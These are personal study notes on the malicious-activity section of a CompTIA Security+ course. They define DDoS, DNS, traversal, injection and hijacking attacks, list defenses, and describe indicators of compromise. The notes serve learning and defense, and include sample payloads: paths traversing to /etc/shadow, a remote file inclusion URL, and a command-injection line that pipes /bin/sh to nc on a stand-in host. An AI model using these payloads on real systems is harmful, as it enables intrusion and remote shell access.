# CompTIA Security+ (SY0-701) Complete Course & Practice Exam  
## Section 19 – Malicious Activity  

[Udemy](https://www.udemy.com/course/securityplus/)  
---

## Overview  
Section 19 examines malicious activity that targets networks, systems, and applications. Learners review denial-of-service attacks, DNS exploits, traversal and escalation attacks, replay and hijacking techniques, injection methods, on-path attacks, and indicators of compromise (IoCs). The focus is on recognizing attack types and understanding their impact.  

---

## Module 19.1: Malicious Activity Overview  
**Learning Objectives:**  
- Define malicious activity in cybersecurity  
- Recognize general attack categories  

**Key Topics:**  
- Encompasses deliberate actions to disrupt, damage, or exploit systems  
- Includes availability attacks, privilege escalation, data theft, and traffic manipulation  
- Understanding attacks helps design defenses  
- understanding cyber threats is the first sep towards their prevention and mitigation
- **Distributed Denial of Service (DDoS):** Denial of Service, Amplified Distributed Denial of Service, Reflected Distributed Denial of Service
- **Domain Name Server (DNS) Attacks:** DNS cache poisoning, DNS amplification attacks, DNS tunneling, Domain hijacking, DNS zone transfer attacks
- **Directory Traversal Attacks/Path Traversal** 
- **Privilege Escalation Attacks**
- **Replay Attacks**
- **Session/Cookie/Session Keu Hijacking**
- **Malicious Code Injection Attacks**
- **Indicators of Compromise (IoC)**

---

## Module 19.2: Distributed Denial of Service (DDoS)  
**Learning Objectives:**  
- Explain how DDoS attacks work  
- Recognize their effects  

**Key Topics:**  
- Overwhelming a system with malicious traffic  
- Botnets used to flood targets with requests  
- Impact: downtime, lost revenue, degraded services  
- Mitigation: traffic filtering, scrubbing, CDNs, rate limiting  
- **Denial of Service (DoS):** used to describe an attack that attempts to make a computer or server's resources unavailable
	- **Flood Attack:** specialized type of DoS which attempts to send more packets to a single server or host
		- **Ping Flood:** a variety of Flood Attack in which a server is sent too many pings (ICMP echo)
		- **SYN Flood:** an attacker will initiate multiple TCP sessions but never complete the three-way handshake
		- Flood Guards, Timeout, Intrusion Prevention
- **Permanent Denial of Service (PDoS):** an attack which eploits a security flaw by reflashing a firmware, permanently breaking a networking device
- **Fork Bomb:** a large number of processes is created to use up a computer's available processing power
	- a Fork Bomb is not a worm because it does not infect programs	
- **Distributed Denial of Service (DDoS):** more machines are used to launch an attack simultneously against a single server to create denial of service condition
	- **DNS Amplification Attack:** specialized DDoS that allows an attacker to initiate DNS requests from a spoof IP address to flood a website
- defensive techniques: blackhole/sinkhole, intrusion prevention, elastic cloud infrastructure

---

## Module 19.3: DNS Attacks  
**Learning Objectives:**  
- Identify DNS attack types  
- Recognize their consequences  

**Key Topics:**  
- DNS poisoning/cache poisoning: redirecting traffic to malicious sites  
- DNS tunneling for covert exfiltration  
- Amplification attacks using DNS servers  
- Mitigation: DNSSEC, monitoring, secure recursive resolvers  
- **Domain Name Server (DNS):** responsible for tanslating human-friendly domain names into IP addresses that computers can understand
- **Domain Name Server (DNS) Attacks:**
	- **DNS Cache Poisoning:** involves corrupting the DNS cache data of a DNS resolver with false information
		- utilize DNSSEC to add a digital signature to the organization's DNS data
		- implement secure network configurtions and firewalls to protect the DNS servers
	- **DNS Amplification Attacks:** the attacker overloads a target system with DNS response traffic by exploiting the DNS resolution process
		- limit the size of DNS responses or rate limit any DNS response traffic
	- **DNS Tunneling:** uses DNS protocol over port 53 to encase non-DNS traffic, trying to evade firewall rules for command control or data exfiltration
		- an attacker can use DNS tunneling to evade a company's firewall and steal sensitive data
	- **Domain Hijacking:** altering a domain name's registration without the original registrant's consent
		- use domain registry lock services to prevent any unauthorized changes to the domain registrations
	- **DNS Zone Transfer Attacks:** the attacker mimics an authorized system to request and obtain the entire DNS zone data for a domain
		- DNS attacks exploit the Domain Name System's vulnerabilities to disrupt service, steal information, or redirect a website's traffic
---

## Module 19.4: Directory Traversal Attack  
**Learning Objectives:**  
- Define directory traversal  
- Recognize how it is exploited  

**Key Topics:**  
- Manipulating input to access unauthorized directories/files  
- Example: `../../etc/passwd` injection  
- Risks: exposure of sensitive system files, credential theft  
- Defenses: input validation, least privilege 
- **Directory Traversal:** a type of injection attack that allows access to commands, files, and directories, either connected to web document root directory or not
	- `http://diontraining.com/../../../../etc/shadow`
	- Unix systems use `../`, Windows systems use `..\` and accepts `../`
	- *Directory Traversals* may be used to access any file on a system with the right permissions
	- **Warning!:** attackers may hide directory traversal attempts by using `%2e%2e%2f` to represent `../`
- **File Inclusion:** allows an attacker to either download files from an arbitrary location or upload an executable or script file to open a backdoor
	- **Remote File Inclusion:** occurs when an attacker tries to execute a script to inject a remote file
		- `https://diontraining.com/login.php?user=http://malware.bad/malicious.php`
	- **Local File Inclusion:** occurs when an attacker tries to add a file that already exists
		- `https://diontraining.com/login.php?user=../../Windows/system32/cmd.exe%00`
- logs containing `../` pertain to directory traversals!

---

## Module 19.5: Execution and Escalation Attacks  
**Learning Objectives:**  
- Explain execution and escalation techniques  
- Recognize their impact  

**Key Topics:**  
- Exploiting software flaws to execute arbitrary code  
- Privilege escalation to gain higher-level access  
- Common in OS and application vulnerabilities  
- Mitigation: patching, least privilege, monitoring  
- **Arbitrary Code Execution:** a vulnerability that allows an attacker to run a code or module that exploits a vulnerability
- **Remote Code Execution:** a type of arbitrary code execution that allows an attacker to transmit code from a remote host
- **Privilege Escalation:** occurs when a user accesses or modifies specific resources that they are not entitled to normally access
	- **Vertical Privilege Escalation:** from normal level user to a higher level
	- **Horizontal Privilege Escalation:** from one user to another of generally the same level
	- applications must have privileges to read and write data and execute functions
	- the arbitrary code inserted in a program is going to take the privileges of whoever is running that program
- **Rootkit:** a class of malware that modifies system files, often at the kernel level, to conceal its presence
	- Kernel Mode, User Mose
	- Kernel Mode rootkits are able to gain complete control over a system, being in ring zero

---

## Module 19.6: Replay Attacks  
**Learning Objectives:**  
- Define replay attacks  
- Recognize risks and defenses  

**Key Topics:**  
- Capturing and retransmitting valid authentication data  
- Allows unauthorized access without cracking credentials  
- Defenses: session tokens, timestamps, encryption  
- **Replay Attack:** attacker intercepts data and decides whether to retransmit it later
- **Session Tokens:** unique data pieces that prevent session replay by attackers
- to reduce the risk of attacks, it's advisable to use the latest security protocols like WPA3 to prevent replay attacks

---

## Module 19.7: Session Hijacking  
**Learning Objectives:**  
- Explain session hijacking  
- Recognize methods used  

**Key Topics:**  
- Taking over an active session (e.g., stealing cookies, session IDs)  
- Allows impersonation of legitimate users  
- Defenses: encryption (TLS), secure cookies, session expiration  
- **Session Management:** a fundamental security component that enables web applications to identify a user
	- information can be stored in database or in cookies
	- **Cookies:** allow web applications to retain information about the users
		- cookies must be protected because they contain client information that is being transmitted across the internet
		- session cookies, persistent cookies
- **Session Hijacking:** a type of spoofing attack where the host is disconnected and replaced by the attacker
	- **Session Prediction:** an attacker attempts to predict the session token to hijack that session
- **Cookie Poisoning:** modifying the contents of a cookie to be sent to a client's browser and exploit the vulnerabilities in an application
	- as a programmer, think thoroughly about the ways to protect information when using cookies

---

## Module 19.8: On-Path Attacks  
**Learning Objectives:**  
- Define on-path attacks (formerly MITM)  
- Recognize their consequences  

**Key Topics:**  
- Attacker intercepts and alters communication between two parties  
- Examples: eavesdropping, data manipulation, credential theft  
- Defenses: TLS, VPNs, certificate pinning  
- **On-path Attack:** an attack where the penetration tester puts the workstation logically between two hosts durng the communication
	- ARP poisoning, DNS poisoning, introducing a rogue Wireless Access Point (WAP), introducing a rogue hover/switch
	- **Replay:** occurs when an attacker captures valid data which is then repeated immediately or delayed and then repeated
	- **SSL Stripping:** tricking the encryption application with an HTTP connection instead of an HTTPS connection
	- **Downgrade Attack:** occurs when an attacker attempts to have a client or server abandon its higher security mode

---

## Module 19.9: Injection Attacks  
**Learning Objectives:**  
- Recognize common injection attack types  
- Explain their impact  

**Key Topics:**  
- Attacker inserts malicious code/commands into input fields  
- Types: SQL, XML, LDAP, command injection  
- Risks: data exposure, system compromise  
- Defenses: input validation, parameterized queries, sanitization  
- **Lightweight Directory Access Protocol (LDAP):** a protocol for access and maintenance of distributed directory information services
	- **LDAP Injection:** an attack in which LDAP statements, typically created by user input, are fabricated
```
string ldapSearch = "(cn = $searchName")";
System.out.println(ldapSearch);
```		- input validation, input sanitization
	- **Command Injection:** a threat actor is able to execute arbitrary shell commands via a vulnerable web application
		- `diontraining.com && hostname`
		- `diontraining.com && /bin/sh | nc hacked.diontraining.com 443
		- input validation can also prevent command injections
	- **Process Injection:** a method of executing arbitrary code in the address space of a separate live process
		- injection through DLLs, thread execution hijacking, process hollowing, process doppelganing, asynchronous procedure calls, portable execution injections
		- endpoint security solutions, security kernel module, practice of least privilege
```

---

## Module 19.10: Indicators of Compromise (IoCs)  
**Learning Objectives:**  
- Define IoCs and their importance  
- Recognize examples  

**Key Topics:**  
- IoCs are forensic artifacts indicating malicious activity  
- Examples: unusual outbound traffic, suspicious logins, file hash changes, abnormal DNS requests  
- Used in threat hunting, detection, and incident response  
- **Indicators of Compromoise (IoC):** data pieces that detect potential malicious activity on a network system
	- **Account Lockout:** signals a compromise when it's triggered by numerous failed login attempts
		- balancing security with usability is crucial when implementing account lockout
	- **Concurrent Session Usage:** one user having multiple active sessions
	- **Blocked Content:** when users try to access or download content that security measures have prevented
	- **Impossible Travel:** when suspicious logins occur from distant locations in a timeframe that makes physical travel between them impossible
	- **Resource Consumption:** unusual resources spikes can signal a compromise
	- **Resource Inaccessibility:** inability to access certain resources, such as files, databases, or network services
	- **Out-of-Cycle Logging:** logging events happening at odd times when no one is supposed to be active
	- **Missing Logs:** attackers delete logs to cover their tracks and hinder investigations
	- **Articles or Documents on Security Breach:** attackers may publicly announce their hacks to brag about their abilities or harm the organization's reputation
- *not all signs of compromise guarantee an actual breach*

---

## Completion Status  
- All Section 19 materials reviewed  
- [Flashcards created for DDoS, DNS attacks, injection methods, and IoCs](https://jeremyrayjewell.neocities.org/security-plus-dion#deck=19)         

---

**Author:** Jeremy Ray Jewell  
[GitHub](https://github.com/jeremyrayjewell) | [LinkedIn](https://www.linkedin.com/in/jeremyrayjewell)  
